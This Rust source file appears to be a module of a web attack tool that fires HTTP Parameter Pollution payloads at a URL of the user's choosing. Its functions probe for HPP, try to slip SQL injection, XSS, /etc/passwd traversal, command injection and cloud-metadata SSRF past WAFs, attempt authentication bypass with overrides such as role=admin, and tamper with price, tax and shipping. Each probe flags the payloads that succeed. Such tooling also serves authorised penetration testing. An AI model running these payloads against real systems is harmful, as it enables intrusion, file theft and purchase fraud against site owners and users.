use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn detect(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} HTTP Parameter Pollution Detection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let status = resp.status().as_u16();
    let body = resp.text().await.unwrap_or_default();
    let baseline_len = body.len();

    println!(
        "  {} Baseline: status={}, {} bytes",
        "*".cyan(),
        status,
        baseline_len
    );

    let hpp_payloads = [
        ("Duplicate param", format!("{}&param=test&param=evil", url)),
        ("Array syntax", format!("{}&param[]=test&param[]=evil", url)),
        (
            "Index syntax",
            format!("{}&param[0]=test&param[1]=evil", url),
        ),
        ("Dot notation", format!("{}&param.test=evil", url)),
        (
            "Nested JSON",
            format!("{}&param={{\"action\":\"evil\"}}", url),
        ),
        ("Encoded dup", format!("{}&param=test%26param%3Devil", url)),
    ];

    println!("\n  {} Testing HPP payloads:", "[*]".cyan().bold());
    for (name, target) in &hpp_payloads {
        match client.get(target).send().await {
            Ok(r) => {
                let s = r.status().as_u16();
                let b = r.text().await.unwrap_or_default();
                let len_diff = b.len() as i64 - baseline_len as i64;
                let tag = if len_diff.abs() > 100 || s != status {
                    format!("status={} diff={} bytes — BEHAVIOR CHANGE", s, len_diff)
                        .red()
                        .bold()
                        .to_string()
                } else {
                    format!("status={} diff={} bytes", s, len_diff)
                };
                println!("    {} {:20} {}", "*".cyan(), name, tag);
            }
            Err(_) => println!("    {} {:20} error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn bypass(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} WAF Bypass via HPP", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let payloads = [
        ("Split SQLi", "id=1&id=1' OR '1'='1"),
        ("Split XSS", "q=hello&q=<script>alert(1)</script>"),
        ("Split traversal", "file=safe&file=../../etc/passwd"),
        ("Split cmdi", "cmd=ls&cmd=;cat /etc/passwd"),
        ("Split SSRF", "url=safe&url=http://169.254.169.254/"),
    ];

    for (name, payload) in &payloads {
        let target = if url.contains('?') {
            format!("{}&{}", url, payload)
        } else {
            format!("{}?{}", url, payload)
        };
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let body = r.text().await.unwrap_or_default();
                let blocked = status == 403
                    || body.contains("blocked")
                    || body.contains("forbidden")
                    || body.contains("WAF");
                let tag = if blocked {
                    "BLOCKED".green().bold().to_string()
                } else {
                    "PASSED WAF".red().bold().to_string()
                };
                println!("  {} {:20} status={} {}", "*".cyan(), name, status, tag);
            }
            Err(_) => println!("  {} {:20} error", "[-]".dimmed(), name),
        }
    }

    println!(
        "\n{} WAFs that inspect first value but backend uses last value are vulnerable.",
        "[*]".yellow().bold()
    );
    Ok(())
}

pub async fn auth(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Auth Bypass via HPP", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let auth_payloads = [
        ("role override", "role=user&role=admin"),
        ("userid override", "userid=123&userid=1"),
        ("isAdmin override", "isAdmin=false&isAdmin=true"),
        ("auth bypass", "auth=0&auth=1"),
        ("permission override", "perm=read&perm=admin"),
        ("debug flag", "debug=0&debug=1"),
    ];

    for (name, payload) in &auth_payloads {
        let target = if url.contains('?') {
            format!("{}&{}", url, payload)
        } else {
            format!("{}?{}", url, payload)
        };
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let body = r.text().await.unwrap_or_default();
                let interesting = status == 200
                    && (body.contains("admin")
                        || body.contains("success")
                        || body.contains("granted"));
                let tag = if interesting {
                    "AUTH BYPASS POSSIBLE".red().bold().to_string()
                } else {
                    format!("status={}", status)
                };
                println!("  {} {:25} {}", "*".cyan(), name, tag);
            }
            Err(_) => println!("  {} {:25} error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn logic(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Business Logic Abuse via HPP", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let logic_payloads = [
        ("Price override", "price=99.99&price=0.01"),
        ("Quantity override", "qty=1&qty=-1"),
        ("Discount abuse", "discount=10&discount=100"),
        ("Currency override", "currency=USD&currency=EUR"),
        ("Tax bypass", "tax=20&tax=0"),
        ("Shipping bypass", "shipping=9.99&shipping=0"),
    ];

    for (name, payload) in &logic_payloads {
        let target = if url.contains('?') {
            format!("{}&{}", url, payload)
        } else {
            format!("{}?{}", url, payload)
        };
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let body = r.text().await.unwrap_or_default();
                let interesting = status == 200
                    && (body.contains("total") || body.contains("price") || body.contains("order"));
                let tag = if interesting {
                    "LOGIC ABUSE POSSIBLE".red().bold().to_string()
                } else {
                    format!("status={}", status)
                };
                println!("  {} {:25} {}", "*".cyan(), name, tag);
            }
            Err(_) => println!("  {} {:25} error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}
